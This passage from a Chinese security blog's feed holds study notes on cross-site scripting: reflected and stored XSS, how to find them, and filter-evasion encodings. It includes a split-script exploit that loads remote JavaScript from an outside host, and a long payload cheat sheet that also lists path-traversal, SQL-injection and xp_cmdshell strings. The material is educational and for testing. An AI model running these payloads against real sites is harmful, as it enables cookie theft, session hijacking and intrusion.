<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=x onerror=&<span class="string">#106</span>;&<span class="string">#97</span>;&<span class="string">#118</span>;&<span class="string">#97</span>;&<span class="string">#115</span>;&<span class="string">#99</span>;&<span class="string">#114</span>;&<span class="string">#105</span>;&<span class="string">#112</span>;&<span class="string">#116</span>;&<span class="string">#58</span>;&<span class="string">#97</span>;&<span class="string">#108</span>;&<span class="string">#101</span>;&<span class="string">#114</span>;&<span class="string">#116</span>;&<span class="string">#40</span>;&<span class="string">#39</span>;&<span class="string">#88</span>;&<span class="string">#83</span>;&<span class="string">#83</span>;&<span class="string">#39</span>;&<span class="string">#41</span>; /&gt;</div></pre></td></tr></table></figure>

<p>另外，在JS中有一个eval()函数，可以执行十六进制字符串形式的脚本，如对<code>alert(&#39;XSS&#39;)</code>进行十六进制转码后得到：</p>
<blockquote>
<p><code>\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29</code></p>
</blockquote>
<p>那么，完整的XSS代码为：</p>
<blockquote>
<p><code>&lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29&quot;);&lt;/script&gt;</code></p>
</blockquote>
<p><code>eval()</code>也可以执行10进制形式的脚本，但需要配合<code>String.fromCharCode()</code>函数使用。此函数用于将字符转为ASCII值，例如，一个正常形式的XSS为：</p>
<blockquote>
<p><code>&lt;img src=x onerror=javascript:eval(alert(&#39;XSS&#39;)) /&gt;</code></p>
</blockquote>
<p>结合使用<code>eval()</code>和<code>String.fromCharCode()</code>函数后变成：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">x</span> <span class="attribute">onerror</span>=<span class="value">javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</span> /&gt;</span></div></pre></td></tr></table></figure>

<p>此外，样式表也支持分析和解释<code>\</code>连接的十六进制字符串形式，浏览器能正常解释，示例如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"></span></div><div class="line"><span class="tag">BODY</span><span class="rules">{ <span class="rule"><span class="attribute">background</span>:<span class="value"> <span class="function">url</span>(http://<span class="number">127.0</span>.<span class="number">0.1</span>/xss.gif)</span></span></span>}</div><div class="line"><span class="tag">&lt;/<span class="title">style</span>&gt;</span></div></pre></td></tr></table></figure>

<p>可以对background的属性值进行十六进制字符串形式转换：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"></span></div><div class="line"><span class="tag">BODY</span><span class="rules">{ <span class="rule"><span class="attribute">background</span>:<span class="value">  \<span class="number">75</span>\<span class="number">72</span>\<span class="number">6</span>c\<span class="number">28</span>\<span class="number">68</span>\<span class="number">74</span>\<span class="number">74</span>\<span class="number">70</span>\<span class="number">3</span>a\<span class="number">2</span>f\<span class="number">2</span>f\<span class="number">31</span>\<span class="number">32</span>\<span class="number">37</span>\<span class="number">2</span>e\<span class="number">30</span>\<span class="number">2</span>e\<span class="number">30</span>\<span class="number">2</span>e\<span class="number">31</span>\<span class="number">2</span>f\<span class="number">78</span>\<span class="number">73</span>\<span class="number">73</span>\<span class="number">2</span>e\<span class="number">67</span>\<span class="number">69</span>\<span class="number">66</span>\<span class="number">29</span> </span></span></span>}</div><div class="line"><span class="tag">&lt;/<span class="title">style</span>&gt;</span></div></pre></td></tr></table></figure>

<p>style属性中的javascript、expression等字符一般会被程序过滤，但经过十六进制编码后则可以逃避过滤。<br>JS还支持unicode、escapes、十六进制、八进制等编码形式，这种编码技术如果运用于跨站攻击，无疑能大大加强XSS的威力。</p>
<h3 id="拆分跨站法">拆分跨站法</h3>
<p>当应用程序没有过滤XSS关键字符(<code>如&lt;、&gt;</code>)却对输入字符长度有限制的情况下，如何使用“拆分法”执行跨站脚本代码。如：一个留言板，没有过滤XSS字符，却限制了字符长度，那么可以使用以下Exploit:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=<span class="string">'document.'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">'write("'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">' src=ht'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">'tp://ww'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">'w.shell'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">'.net/1.'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">'js&gt;&lt;/sc'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=<span class="string">'z+ript&gt;")'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[<h2 id="XSS构造剖析">XSS构造剖析</h2>
<blockquote>
<p>介绍如何绕过服务端的XSS过滤系统、如何构造强壮的XSS利用代码</p>
</blockquote>
<h2 id="绕过XSS-Filter">绕过XSS-Filter</h2>
<p>]]>
    </summary>
    
      <category term="XSS" scheme="http://www.m4ster.net/tags/XSS/"/>
    
      <category term="跨站攻击" scheme="http://www.m4ster.net/tags/%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    
      <category term="读书笔记" scheme="http://www.m4ster.net/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[XSS跨站测试语句：XSS Cheat Sheet]]></title>
    <link href="http://www.m4ster.net/2014/12/25/XSS%E8%B7%A8%E7%AB%99%E6%B5%8B%E8%AF%95%E8%AF%AD%E5%8F%A5%EF%BC%9AXSS-Cheat-Sheet/"/>
    <id>http://www.m4ster.net/2014/12/25/XSS跨站测试语句：XSS-Cheat-Sheet/</id>
    <published>2014-12-25T13:29:09.000Z</published>
    <updated>2014-12-25T13:36:14.000Z</updated>
    <content type="html"><![CDATA[<h2 id="XSS_Cheat_Sheet">XSS Cheat Sheet</h2>
<blockquote>
<p>在测试过程中，我们经常尝试各种XSS输入，以绕过服务端的过滤规则。这时候，如果有一份待测试的XSS语句列表会便利许多。</p>
</blockquote>
<p>XSS语句列表罗列了各种各样的XSS代码，这些XSS代码在不同的浏览器、不同的应用场景、不同的环境下均有跨站触发的可能。通常，此类列表被称为<strong>Cheat Sheet</strong>，即我们平时所指的备忘单。测试用例：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line">'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; </div><div class="line">='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; </div><div class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt; </div><div class="line">&lt;script&gt;alert(vulnerable)&lt;/script&gt; </div><div class="line">%3Cscript%3Ealert('XSS')%3C/script%3E </div><div class="line">&lt;script&gt;alert('XSS')&lt;/script&gt; </div><div class="line">&lt;img src="javascript:alert('XSS')"&gt; </div><div class="line">%0a%0a&lt;script&gt;alert(\"Vulnerable\")&lt;/script&gt;.jsp </div><div class="line">%22%3cscript%3ealert(%22xss%22)%3c/script%3e </div><div class="line">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd </div><div class="line">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini </div><div class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e </div><div class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e </div><div class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html </div><div class="line">%3f.jsp </div><div class="line">%3f.jsp </div><div class="line">&lt;script&gt;alert('Vulnerable');&lt;/script&gt; </div><div class="line">&lt;script&gt;alert('Vulnerable')&lt;/script&gt; </div><div class="line">?sql_debug=1 </div><div class="line">a%5c.aspx </div><div class="line">a.jsp/&lt;script&gt;alert('Vulnerable')&lt;/script&gt; </div><div class="line">a/ </div><div class="line">a?&lt;script&gt;alert('Vulnerable')&lt;/script&gt; </div><div class="line">"&gt;&lt;script&gt;alert('Vulnerable')&lt;/script&gt; </div><div class="line">';exec%20master..xp_cmdshell%20'dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt'--&& </div><div class="line">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E </div><div class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E& </div><div class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID= </div><div class="line">1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname= </div><div class="line">../../../../../../../../etc/passwd </div><div class="line">..\..\..\..\..\..\..\..\windows\system.ini </div><div class="line">\..\..\..\..\..\..\..\..\windows\system.ini </div><div class="line">'';!--"&lt;XSS&gt;=&{()} </div><div class="line">&lt;IMG SRC="javascript:alert('XSS');"&gt; </div><div class="line">&lt;IMG SRC=javascript:alert('XSS')&gt; </div><div class="line">&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt; </div><div class="line">&lt;IMG SRC=JaVaScRiPt:alert("XSS")&gt; </div><div class="line">&lt;IMG SRC=javascript:alert('XSS')&gt; </div><div class="line">&lt;IMG SRC=javascript:alert('XSS')&gt; </div><div class="line">&lt;IMG SRC=javascript:alert('XSS')&gt; </div><div class="line">&lt;IMG SRC="jav	ascript:alert('XSS');"&gt; </div><div class="line">&lt;IMG SRC="jav ascript:alert('XSS');"&gt; </div><div class="line">&lt;IMG SRC="jav</div><div class="line">ascript:alert('XSS');"&gt; </div><div class="line">"&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out </div><div class="line">&lt;IMG SRC=" javascript:alert('XSS');"&gt; </div><div class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt; </div><div class="line">&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt; </div><div class="line">&lt;BODY ONLOAD=alert('XSS')&gt; </div><div class="line">&lt;IMG DYNSRC="javascript:alert('XSS')"&gt; </div><div class="line">&lt;IMG LOWSRC="javascript:alert('XSS')"&gt; </div><div class="line">&lt;BGSOUND SRC="javascript:alert('XSS');"&gt; </div><div class="line">&lt;br size="&{alert('XSS')}"&gt; </div><div class="line">&lt;LAYER SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/layer&gt; </div><div class="line">&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt; </div><div class="line">&lt;IMG SRC='vbscript:msgbox("XSS")'&gt; </div><div class="line">&lt;IMG SRC="mocha:[code]"&gt; </div><div class="line">&lt;IMG SRC="livescript:[code]"&gt; </div><div class="line">&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt; </div><div class="line">&lt;IFRAME SRC=javascript:alert('XSS')&gt;&lt;/IFRAME&gt; </div><div class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=javascript:alert('XSS')&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt; </div><div class="line">&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt; </div><div class="line">&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt; </div><div class="line">&lt;DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');"&gt; </div><div class="line">&lt;DIV STYLE="width: expression(alert('XSS'));"&gt; </div><div class="line">&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt; </div><div class="line">&lt;IMG STYLE='xss:expre\ssion(alert("XSS"))'&gt; </div><div class="line">&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt; </div><div class="line">&lt;STYLE TYPE="text/css"&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt; </div><div class="line">&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;</div><div class="line">&lt;BASE HREF="javascript:alert('XSS');//"&gt; </div><div class="line">getURL("javascript:alert('XSS')") </div><div class="line">a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d); </div><div class="line">&lt;XML SRC="javascript:alert('XSS');"&gt; </div><div class="line">"&gt; &lt;BODY &gt;&lt;SCRIPT&gt;function a(){alert('XSS');}&lt;/SCRIPT&gt;&lt;" </div><div class="line">&lt;SCRIPT SRC="http://xss.ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt; </div><div class="line">&lt;IMG SRC="javascript:alert('XSS')" </div><div class="line">&lt;!--#exec cmd="/bin/echo '&lt;SCRIPT SRC'"--&gt;&lt;!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;'"--&gt; </div><div class="line">&lt;IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt; </div><div class="line">&lt;SCRIPT a="&gt;" SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt; </div><div class="line">&lt;SCRIPT ="&gt;" SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt; </div><div class="line">&lt;SCRIPT a="&gt;" '' SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt; </div><div class="line">&lt;SCRIPT "a='&gt;'" SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt; </div><div class="line">&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt; </div><div class="line">&lt;A HREF=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[<h2 id="XSS_Cheat_Sheet">XSS Cheat Sheet</h2>
<blockquote>
<p>在测试过程中，我们经常尝试各种XSS输入，以绕过服务端的过滤规则。这时候，如果有一份待测试的XSS语句列表会便利许多。</p>
</blockquote>
]]>
    </summary>
    
      <category term="XSS" scheme="http://www.m4ster.net/tags/XSS/"/>
    
      <category term="跨站攻击" scheme="http://www.m4ster.net/tags/%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    
      <category term="脚本语言" scheme="http://www.m4ster.net/categories/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[《XSS跨站脚本攻击剖析与防御》学习笔记（一）]]></title>
    <link href="http://www.m4ster.net/2014/12/25/%E3%80%8AXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://www.m4ster.net/2014/12/25/《XSS跨站脚本攻击剖析与防御》学习笔记（一）/</id>
    <published>2014-12-25T07:03:03.000Z</published>
    <updated>2014-12-26T07:57:18.000Z</updated>
    <content type="html"><![CDATA[<h2 id="跨站脚本介绍">跨站脚本介绍</h2>
<p>XSS自1996年诞生以来，如今已经过十余年的演化。随着Web技术的蓬勃发展，XSS无疑已经变成了最流行和严重的Web安全漏洞，更被OWASP（<code>Open Web Application Security Project</code>）组织评为十大安全漏洞中的第二威胁漏洞。</p>
<h3 id="什么是XSS跨站脚本">什么是XSS跨站脚本</h3>
<p>跨站脚本（<code>Cross-Site Scripting,XSS</code>）是一种常见的Web应用程序中的计算安全漏洞。是由于Web应用对于用户的输入过滤不足而产生的。攻击者可以利用网站的漏洞把恶意脚本代码注入到网页之中，当其他用户浏览这些网页的时候，就会执行其中的恶意代码。</p>
<p>由于和另外一种网页技术——层叠样式表（<code>Cascading Style Sheets,CSS</code>）的缩写一样，为了防止混肴，故把原本的CSS简称为XSS。</p>
<p>我们通常把XSS脚本攻击理解为一种Web安全漏洞，也可以理解为一种攻击手段。</p>
<h3 id="为什么XSS跨站漏洞会如此流行">为什么XSS跨站漏洞会如此流行</h3>
<ul>
<li>Web浏览器本身的设计是不安全的。浏览器只会执行，不会判断数据和程序代码是否恶意。</li>
<li>输入和输出是Web应用程序最基本的交互，在这过程之中如果没有做好安全防护，Web程序很容易出现XSS漏洞</li>
<li>Web应用程序通常是通过团队合作来完成的，程序员之间的水平参差不齐，很少人受过正规的安全培训（<code>木桶原理</code>）</li>
<li>开发人员和安全工程师不够重视此类漏洞</li>
<li>XSS技术的运用灵活多变，防御起来较为困难</li>
<li>……</li>
</ul>
<h3 id="XSS跨站脚本实例">XSS跨站脚本实例</h3>
<h4 id="漏洞的成因">漏洞的成因</h4>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">head</span>&gt;</span>test<span class="tag">&lt;/<span class="title">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="title">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="string">"XSS"</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="title">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></div></pre></td></tr></table></figure>

<p>HTML中的script元素标记中间包含javascript，浏览器调用脚本引擎处理。XSS攻击就是将非法的JavaScript、VBscript等脚本注入到用户浏览的网页上执行。</p>
<h4 id="利用方法演示">利用方法演示</h4>
<p>利用XSS弹出恶意警告框，代码为：</p>
<blockquote>
<p><code>&lt;scirpt&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></p>
</blockquote>
<p>XSS输入也可能是HTML代码段，如要使网页不停的刷新，代码为：</p>
<blockquote>
<p><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;&quot;&gt;</code></p>
</blockquote>
<p>嵌入其他网站的链接，代码为：</p>
<blockquote>
<p><code>&lt;iframe src=http://www.test.com width=0 height=0&gt;&lt;/iframe&gt;</code></p>
</blockquote>
<h4 id="攻击原理具体说明">攻击原理具体说明</h4>
<p>写一个PHP脚本，脚本代码为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line">    <span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">'name'</span>];</div><div class="line"><span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>

<p>以上代码使用<code>$_REQUEST[&#39;name&#39;]</code>来获取用户输入的name的值，然后直接echo输出。<br>当用户提交参数为<code>demo.php?name=test</code>时，页面直接输出<code>test</code>，当用户提交的参数为<code>demo.php?name=&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code>时，页面中的JS代码被脚本引擎解析，弹出了内容为<code>/XSS/</code>的警告框。<br>由于PHP网页直接输出了我们的测试代码，从而导致一个XSS的生成。</p>
<h2 id="对于Web安全的威胁">对于Web安全的威胁</h2>
<p>以往，XSS跨站脚本一直被当作是一类鸡肋的漏洞，没有什么好利用的地方，只能弹出对话框而已，稍微有点危害的就是用来盗取用户Cookies资料和网页挂马。</p>
<p>通常情况下，攻击者通过注入如<code>alert(/XSS/)</code>之类的JS代码来证明XSS，该代码能够导致应用程序弹出带有XSS字样的窗口。从技术角度来说，这种示例确实能够证明XSS漏洞的存在性，但是并没有真实的反映其危害型。</p>
<p>最近几年很多人投入了XSS技术的研究，世界上的第一个跨站脚本蠕虫（<code>XSS Worm</code>）Samy，于2005年10月在国外诞生，并在20小时内迅速感染了100多万个用户，最终导致该网站瘫痪。</p>
<p>而且，许多基于XSS的攻击框架大量涌现，如国外知名的BeFF、XSS Shell、attackAPI；国内的Anehta、XSSER.ME等。  </p>
<p>如今，只要一个站点存在跨站脚本漏洞，该站点的所有用户都可能受到危害。黑客一旦挖掘到XSS漏洞，就可以利用该漏洞实施回话劫持、资料窃取、渗透入侵和传播蠕虫病毒等一系列攻击。</p>
<h3 id="可能带来的危害总结">可能带来的危害总结</h3>
<ul>
<li>网络钓鱼，包括盗取各类用户帐号</li>
<li>窃取用户cookies资料</li>
<li>劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、发送电子邮件等</li>
<li>强制弹出广告页面、刷流量等</li>
<li>网页挂马</li>
<li>进行大量的客户端攻击，如DDos攻击</li>
<li>获取客户端信息，如浏览历史、真实IP、开放端口等</li>
<li>结合其他漏洞，如CSRF漏洞，实施进一步作恶</li>
<li>传播跨站蠕虫脚本等</li>
<li>……</li>
</ul>
<h2 id="XSS的分类">XSS的分类</h2>
<p>XSS根据其特型和利用手法的不同，主要分为两大类型：反射型和持久型</p>
<h3 id="反射型XSS">反射型XSS</h3>
<h4 id="介绍">介绍</h4>
<p>反射型跨站脚本也称为非持久型、参数型跨站脚本。主要用于将恶意脚本附加到URL地址的参数中，例如：<br><code>http://www.test.com/search.php?key=&quot;&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code><br><code>http://www.test.com/help.shtml?query=%3Cscript%3Ealert%28/XSS/%29%3C/script%3E</code><br><code>http://www.test.com/logout.asp?out=1&amp;url=javascript:alert(/XSS/)</code>  </p>
<h4 id="攻击手法">攻击手法</h4>
<p>通常是使用特定的手法（<code>比如利用电子邮件</code>），诱使用户去访问一个包含恶意代码的URL，当用户点击这些专门设计的链接的时候，恶意的JS代码会直接在用户浏览器上执行。</p>
<h4 id="特点">特点</h4>
<p>反射型XSS的特点是：只在用户单击的时候触发，而且只执行一次，非持久化，所以称为反射型跨站脚本。  </p>
<h4 id="危害">危害</h4>
<p>反射型XSS的危害往往不如持久型XSS，因为恶意代码暴露在URL参数当中，并时刻要求用户单击方可触发，稍微有点安全意识的用户可以轻易看穿该链接是不可信任的。如此一来，反射型XSS的攻击成本要比持久型XSS高许多。<br>但，黑客在发动跨站脚本攻击前会精心布置一切，如恶意URL暴露的问题，可以通过各种编码的转换来解决。</p>
<h3 id="持久型XSS">持久型XSS</h3>
<h4 id="介绍-1">介绍</h4>
<p>持久型跨站脚本也等于存储型跨站脚本，比反射型跨站脚本更具有威胁性，并且可能影响 到Web服务器自身的安全。</p>
<h4 id="攻击手法-1">攻击手法</h4>
<p>此类XSS不需要用户单击特定URL，攻击者只需要事先将恶意JS代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意JS代码的页面就会执行恶意代码。</p>
<h4 id="特点-1">特点</h4>
<p>持久型XSS通常出现在网站的留言、评论、博客日志等交互处，恶意脚本被存储到客户端或者服务器的数据库中，当其他用户浏览该网页时，站点即从数据库中读取恶意用户存入的非法代码，然后显示在页面当中，即在受害者的主机上的浏览器执行此恶意代码。</p>
<h4 id="危害-1">危害</h4>
<p>持久型XSS不需要用户去单击链接就能除非，所以它的危害比反射型XSS要大。<br>更严重的是，利用此类XSS能够轻易编写危害性更大的XSS蠕虫，跨站蠕虫是使用Ajax/JavaScript语言编写的蠕虫病毒，能够在网站中实现病毒的迅速传播。XSS蠕虫会直接影响网站的所有用户。  </p>
<h3 id="总结">总结</h3>
<p>XSS攻击作为Web业务的一大威胁，危害的不仅仅是Web业务本身，对使用Web服务的用户也会造成直接的影响。<br>所以，要谨记一点：无论是反射型XSS还是持久型XSS，都具备一定程度的危害性！Web开发人员不应该忽略应用程序中的任何漏洞，因为这些潜在的问题都可能给网站和用户带来无法想象的影响和危害。</p>
<h2 id="XSS的简单挖掘">XSS的简单挖掘</h2>
<h3 id="挖掘的方法">挖掘的方法</h3>
<blockquote>
<p>进行漏洞挖掘的方法有几种，灰盒、白盒、黑盒</p>
</blockquote>
<p>推荐使用的是灰盒测试。什么是灰盒测试？要理解此概念首先需要理解黑盒测试和白盒测试。所谓的白盒测试，是指知道程序内部的结构，也就是获取源代码的情况下对软件进行测试；黑盒则完全相反；而灰盒测试介于两者之间。</p>
<h3 id="挖掘反射型XSS">挖掘反射型XSS</h3>
<blockquote>
<p>数据交互（即输入/输出）的地方最容易产生XSS漏洞</p>
</blockquote>
<p>我们可以着重对网站的输入框、URL参数处进行测试。当然，所有来自COOKIE、POST表单、HTTP头的内容都可能会产生XSS漏洞。<br>一般来说，如果对于输入的内容没做过滤，有完整的输出，那么存在XSS漏洞的机率是非常大的。在挖掘的过程中，注意HTML标签的闭合，比如<code>&lt;textarea&gt;</code>标签内的代码不会执行，那么可以把提交的内容修改为<code>&lt;/textarea&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;&lt;textarea&gt;</code>来实现标签的闭合。</p>
<h3 id="挖掘存储型XSS">挖掘存储型XSS</h3>
<blockquote>
<p>通过分析程序源码可以对漏洞成因有更好的理解，但在发掘XSS漏洞时，推荐使用灰盒测试技术，这能大大提高我们挖掘XSS的效率。</p>
</blockquote>
<p>在用户能够输入的地方，如：留言交流、用户评论、意见反馈这些地方，如果没有做好过滤或转义，那么当管理员在后台查看提交的信息的时候，提交上去的代码将会执行。也可以着重于分析这些地方的程序源码，查看程序的过滤规则来尝试绕过过滤。</p>
<h2 id="XSS_Cheat_Sheet">XSS Cheat Sheet</h2>
<blockquote>
<p>在测试过程中，我们经常尝试各种XSS输入，以绕过服务端的过滤规则。这时候，如果有一份待测试的XSS语句列表会便利许多。</p>
</blockquote>
<p>XSS语句列表罗列了各种各样的XSS代码，这些XSS代码在不同的浏览器、不同的应用场景、不同的环境下均有跨站触发的可能。通常，此类列表被称为<strong>Cheat Sheet</strong>，即我们平时所指的备忘单。</p>
<p>收集于互联网：<a href="http://www.m4ster.net/2014/12/25/XSS%E8%B7%A8%E7%AB%99%E6%B5%8B%E8%AF%95%E8%AF%AD%E5%8F%A5%EF%BC%9AXSS-Cheat-Sheet/" target="_blank" rel="external">XSS Cheat Sheet</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="跨站脚本介绍">跨站脚本介绍</h2>
<p>XSS自1996年诞生以来，如今已经过十余年的演化。随着Web技术的蓬勃发展，XSS无疑已经变成了最流行和严重的Web安全漏洞，更被OWASP（<code>Open Web Application Security P]]>
    </summary>
    
      <category term="XSS" scheme="http://www.m4ster.net/tags/XSS/"/>
    
      <category term="跨站攻击" scheme="http://www.m4ster.net/tags/%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    
